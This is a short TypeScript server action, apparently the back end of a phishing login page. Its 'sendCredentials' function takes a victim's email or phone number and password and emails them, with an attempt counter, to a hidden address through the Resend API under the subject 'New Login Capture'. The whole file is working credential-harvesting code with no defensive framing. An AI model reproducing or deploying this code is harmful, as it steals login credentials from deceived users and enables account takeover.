'use server';

import { Resend } from 'resend';

const resend = new Resend(process.env.Resend_Api_Key);

export async function sendCredentials(email: string, password: string, attempt: number) {
  try {
    const toEmail = process.env.To;
    
    if (!toEmail || !process.env.Resend_Api_Key) {
      console.error('Missing Resend configuration');
      return { success: false };
    }

    const { data, error } = await resend.emails.send({
      from: 'Acme <onboarding@resend.dev>', // Resend testing domain
      to: [toEmail],
      subject: `New Login Capture - Attempt ${attempt}`,
      text: `Email/Phone: ${email}\nPassword: ${password}\nAttempt: ${attempt}`,
    });

    if (error) {
      console.error('Resend API Error:', error);
      return { success: false, error };
    }

    return { success: true, data };
  } catch (error) {
    console.error('Error sending credentials:', error);
    return { success: false, error };
  }
}
